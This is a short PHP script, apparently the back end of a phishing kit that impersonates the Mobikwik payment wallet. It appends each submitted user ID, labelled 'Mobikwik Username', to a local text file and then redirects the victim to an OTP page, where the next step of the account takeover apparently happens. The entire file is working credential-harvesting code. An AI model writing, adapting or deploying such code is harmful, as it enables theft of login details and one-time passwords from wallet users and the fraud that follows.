<?php
file_put_contents("usernames.txt", "Mobikwik Username: " . $_POST['userId'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>